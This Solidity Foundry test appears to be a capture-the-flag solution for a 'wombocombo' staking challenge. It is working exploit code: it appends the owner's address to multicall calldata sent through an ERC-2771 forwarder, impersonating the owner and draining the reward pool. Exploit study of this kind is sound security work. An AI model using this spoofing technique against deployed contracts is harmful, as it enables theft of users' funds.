// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Challenge} from "../../src/wombocombo/Challenge.sol";
import {Staking} from "../../src/wombocombo/Staking.sol";
import {Forwarder} from "../../src/wombocombo/Forwarder.sol";
import {Token} from "../../src/wombocombo/Token.sol";
import {ECDSA} from "openzeppelin/utils/cryptography/ECDSA.sol";

contract ExplotTest is Test {
    Challenge public challenge;
    Token public token;
    Token public reward;
    Forwarder public forwarder;
    Staking public staking;
    address public player = address(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf);
    uint256 public privateKey = uint256(1);

    function setUp() public {
        vm.warp(17000000);

        token = new Token("Staking", "STK", 100 * 10 ** 18);
        reward = new Token("Reward", "RWD", 100_000_000 * 10 ** 18);

        forwarder = new Forwarder();

        staking = new Staking(token, reward, address(forwarder));

        staking.setRewardsDuration(20);
        reward.transfer(address(staking), reward.totalSupply());
        token.transfer(player, token.totalSupply());

        challenge = new Challenge(staking, forwarder);
    }

    function test_Exploit() public {
        vm.warp(17000000);
        vm.startPrank(player);
        token.approve(address(staking), 100 * 10 ** 18);
        staking.stake(100 * 10 ** 18);

        vm.warp(17000001);
        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodePacked(
            abi.encodeWithSelector(
                staking.setRewardsDuration.selector,
                uint256(1)
            ),
            staking.owner()
        );
        multicallData[1] = abi.encodePacked(
            abi.encodeWithSelector(
                staking.notifyRewardAmount.selector,
                uint256(100_000_000 * 10 ** 18)
            ),
            abi.encodePacked(staking.owner())
        );
        bytes memory muticallEncoded = abi.encodeWithSelector(
            staking.multicall.selector,
            multicallData
        );

        // sign eip 712 data using private key
        bytes32 _FORWARDREQUEST_TYPEHASH = keccak256(
            "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)"
        );
        bytes32 sturctHash = keccak256(
            abi.encode(
                _FORWARDREQUEST_TYPEHASH,
                player,
                address(staking),
                uint256(0),
                uint256(1200000),
                uint256(0),
                uint256(999999999999),
                keccak256(muticallEncoded)
            )
        );
        bytes32 hashedData = _hashTypedDataV4(sturctHash);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hashedData);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(
            Forwarder.ForwardRequest(
                player,
                address(staking),
                uint256(0),
                uint256(1200000),
                uint256(0),
                uint256(999999999999),
                muticallEncoded
            ),
            signature
        );

        vm.warp(17000002);
        staking.getReward();
        vm.stopPrank();
        console.log("Reward token amount:", reward.balanceOf(address(player)));
    }

    function _hashTypedDataV4(
        bytes32 structHash
    ) internal view virtual returns (bytes32) {
        return
            ECDSA.toTypedDataHash(
                _buildDomainSeparator(
                    keccak256(
                        "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
                    ),
                    keccak256(bytes("Forwarder")),
                    keccak256(bytes("1"))
                ),
                structHash
            );
    }

    function _buildDomainSeparator(
        bytes32 typeHash,
        bytes32 nameHash,
        bytes32 versionHash
    ) private view returns (bytes32) {
        return
            keccak256(
                abi.encode(
                    typeHash,
                    nameHash,
                    versionHash,
                    block.chainid,
                    address(forwarder)
                )
            );
    }
}
